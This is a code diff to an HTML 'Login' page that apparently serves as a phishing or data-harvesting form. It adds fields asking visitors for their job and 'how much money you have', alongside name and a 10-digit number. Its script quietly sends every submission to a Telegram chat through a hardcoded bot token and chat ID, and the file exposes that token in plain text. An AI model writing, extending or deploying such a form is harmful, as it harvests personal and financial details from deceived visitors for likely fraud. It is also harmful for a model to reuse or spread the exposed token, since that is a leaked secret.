@@ -22,10 +22,22 @@
     <div class="login-box">
       <div class="clock" id="clock"></div>
       <h2>Login</h2>
+
       <input type="text" id="name" placeholder="Enter name" required />
       <div class="error-message" id="name-error">
         Please enter a valid name.
       </div>
+
+      <input
+        type="text"
+        id="jobName"
+        placeholder="Enter job name"
+        required
+      />
+      <div class="error-message" id="job-error">
+        Please enter your job name.
+      </div>
+
       <input
         type="text"
         id="message"
@@ -37,6 +49,18 @@
       <div class="error-message" id="number-error">
         Please enter a 10-digit number.
       </div>
+
+      <input
+        type="number"
+        id="money"
+        placeholder="How much money you have"
+        min="0"
+        required
+      />
+      <div class="error-message" id="money-error">
+        Please enter a valid amount of money.
+      </div>
+
       <button onclick="validateAndProcess()">Submit</button>
     </div>
 
@@ -67,19 +91,6 @@
           name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
       }
 
-      // Get a cookie value by name
-      function getCookie(name) {
-        const nameEQ = name + "=";
-        const cookies = document.cookie.split(";");
-        for (let i = 0; i < cookies.length; i++) {
-          let cookie = cookies[i].trim();
-          if (cookie.indexOf(nameEQ) === 0) {
-            return decodeURIComponent(cookie.substring(nameEQ.length));
-          }
-        }
-        return null;
-      }
-
       // Redirect if cookies are already set
       function checkCookiesAndRedirect() {
         const userName = getCookie("userName");
@@ -90,11 +101,62 @@
         }
       }
 
+      // Validate and process login
+      function validateAndProcess() {
+        const name = document.getElementById("name").value.trim();
+        const jobName = document.getElementById("jobName").value.trim();
+        const message = document.getElementById("message").value.trim();
+        const money = document.getElementById("money").value.trim();
+
+        const nameError = document.getElementById("name-error");
+        const jobError = document.getElementById("job-error");
+        const numberError = document.getElementById("number-error");
+        const moneyError = document.getElementById("money-error");
+
+        let isValid = true;
+
+        if (!name) {
+          nameError.style.display = "block";
+          isValid = false;
+        } else {
+          nameError.style.display = "none";
+        }
+
+        if (!jobName) {
+          jobError.style.display = "block";
+          isValid = false;
+        } else {
+          jobError.style.display = "none";
+        }
+
+        if (message.length !== 10) {
+          numberError.style.display = "block";
+          isValid = false;
+        } else {
+          numberError.style.display = "none";
+        }
+
+        if (!money || isNaN(money) || Number(money) <= 0) {
+          moneyError.style.display = "block";
+          isValid = false;
+        } else {
+          moneyError.style.display = "none";
+        }
+
+        if (isValid) {
+          setCookie("userName", name, 7);
+          setCookie("userJob", jobName, 7);
+          setCookie("userNumber", message, 7);
+          setCookie("userMoney", money, 7);
+          sendMessageToTelegram(name, jobName, message, money);
+        }
+      }
+
       // Send login details to Telegram
-      function sendMessageToTelegram(name, number) {
+      function sendMessageToTelegram(name, jobName, number, money) {
         const chatId = "5786268361"; // Your Telegram chat ID
         const botToken = "7769361866:AAE5mLkwPGOOR8yaY-NgeOew0EpXei7y7W4"; // Your Telegram bot token
-        const message = `Name: ${name}\nNumber: ${number}`;
+        const message = `Name: ${name}\nJob: ${jobName}\nNumber: ${number}\nMoney: ${money}`;
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
           message
         )}`;
@@ -113,42 +175,25 @@
           });
       }
 
-      // Validate and process login
-      function validateAndProcess() {
-        const name = document.getElementById("name").value.trim();
-        const message = document.getElementById("message").value;
-        const nameError = document.getElementById("name-error");
-        const numberError = document.getElementById("number-error");
-
-        let isValid = true;
-
-        if (!name) {
-          nameError.style.display = "block";
-          isValid = false;
-        } else {
-          nameError.style.display = "none";
-        }
-
-        if (message.length !== 10) {
-          numberError.style.display = "block";
-          isValid = false;
-        } else {
-          numberError.style.display = "none";
-        }
-
-        if (isValid) {
-          setCookie("userName", name, 7); // Store for 7 days
-          setCookie("userNumber", message, 7); // Store for 7 days
-          sendMessageToTelegram(name, message);
-        }
-      }
-
       // Initialize the script after the page has fully loaded
       document.addEventListener("DOMContentLoaded", () => {
         updateClock();
         checkCookiesAndRedirect();
-        setInterval(updateClock, 1000); // Update the clock every second
+        setInterval(updateClock, 1000);
       });
+
+      // Get a cookie value by name
+      function getCookie(name) {
+        const nameEQ = name + "=";
+        const cookies = document.cookie.split(";");
+        for (let i = 0; i < cookies.length; i++) {
+          let cookie = cookies[i].trim();
+          if (cookie.indexOf(nameEQ) === 0) {
+            return decodeURIComponent(cookie.substring(nameEQ.length));
+          }
+        }
+        return null;
+      }
     </script>
   </body>
 </html>
